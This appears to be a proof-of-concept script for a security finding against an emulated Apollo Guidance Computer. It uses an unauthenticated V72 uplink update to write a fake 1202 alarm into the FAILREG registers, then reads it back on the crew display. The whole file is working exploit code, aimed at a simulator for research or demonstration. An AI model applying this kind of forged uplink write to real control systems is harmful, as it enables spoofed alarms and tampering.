"""Finding 2: arbitrary erasable write over an unauthenticated uplink.

Target: FAILREG (ECADR 0375), the three alarm-code registers.

Nothing is ever touched on the physical panel.  From the ground we:

  1. enter P00 (P27 only accepts updates there),
  2. set DSKYFLAG so the crew's display is on  -- itself a V72 write,
  3. read the alarm registers, establishing a clean all-zero baseline,
  4. write 01202 into FAILREG,
  5. read them again with V05N09E -- the same keystrokes the crew used on
     20 July 1969.

The executive is never loaded and no core sets are exhausted.  The alarm is
pure fabrication.
"""
import sys, os
BOOT_SETTLE = 10.0   # AGC fresh start must complete before it accepts input
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from agc_link import AGC
from p27 import v72_write, verb, noun, load, enable_display

FAILREG = 0o0375

agc = AGC()
agc.pump(BOOT_SETTLE)

print("=== 1. enter P00, and switch the crew display on from the ground ===")
verb(agc, 37)
load(agc, 0)
agc.pump(1.5)
enable_display(agc)
agc.pump(1.5)

print("\n=== 2. read alarm registers BEFORE (V05N09E) ===")
verb(agc, 5)
noun(agc, 9)
agc.pump(2.5)
print(agc.render())

print("\n=== 3. uplink a V72 scatter update targeting FAILREG ===")
v72_write(agc, [(FAILREG, 0o1202)])
agc.pump(2.0)

print("\n=== 4. read alarm registers AFTER (V05N09E) ===")
verb(agc, 5)
noun(agc, 9)
agc.pump(2.5)
print(agc.render())
